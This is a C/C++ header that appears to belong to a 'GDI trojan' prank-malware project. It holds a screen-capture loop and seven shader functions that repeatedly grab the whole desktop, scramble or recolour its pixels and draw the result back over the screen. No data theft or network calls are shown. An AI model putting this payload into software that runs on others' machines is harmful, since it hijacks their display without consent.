#pragma once
DWORD xs;

void SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}

DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
void GDIShader(TROJAN_SHADER shader, int nTime)
{
	int dwStartTime = Time;
	HDC hdcScreen = GetDC(NULL);
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen;
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = szScreen.cx;
	bmi.bmiHeader.biHeight = szScreen.cy;

	prgbScreen = { 0 };

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int i = 0; Time < (dwStartTime + nTime); i++)
	{
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
		shader(i, szScreen.cx, szScreen.cy, prgbScreen);
		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}

	DeleteObject(hbmScreen);
	DeleteDC(hdcTempScreen);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}
void gdishader1(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb * 1) % (RGB(111, 222, 333));
	}
}
void gdishader2(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			int temp1 = (i + 20);
			if (temp1 < 0)
			{
				temp1 = -temp1;
			}
			int temp2 = (j + rand() % 20);
			if (temp2 < 0)
			{
				temp2 = -temp2;
			}
			prgbScreen[i * w + j].rgb = prgbScreen[(temp1 * w + temp2) % (w * h)].rgb;
		}
	}
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((r) / 1, (g) / 1, (b) / 1) + (r)) % (RGB(25, 44, 66));
	}
}
void gdishader3(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			int randPixel = rand() % 55;
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + i / 15) % 404, (prgbScreen[randPixel].r + j / 15) % 404, (prgbScreen[randPixel].r + 55));
		}
	}
}
void gdishader4(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 140) % 333, int(sqrt((r + g + b)) / 5 + t) % 444, int(sqrt((r + g + b)) / 3 + i) % 404) % (RGB(10, 55, 111)) + t * 15;
	}
}
void gdishader5(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb - Xorshift32() % int(sqrt(i + 5))) % (RGB(111, 222, 333));
	}
}
void gdishader6(int t, int w, int h, PRGBQUAD prgbScreen) {
	t *= 20;
	for (int i = 0; i < w; i++) {
		for (int j = 0; j < h; j++) {
			prgbScreen[i * j].rgb = RGB(i % 666, j % 666, t % 666);
		}
	}
}
void gdishader7(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 150) % 150, int(sqrt((r)) / 30 + t) % 112, int(sqrt((r + g + b)) / 25 + i) % 112) % (RGB(6, 6, 49) * 5) + 15;
	}
}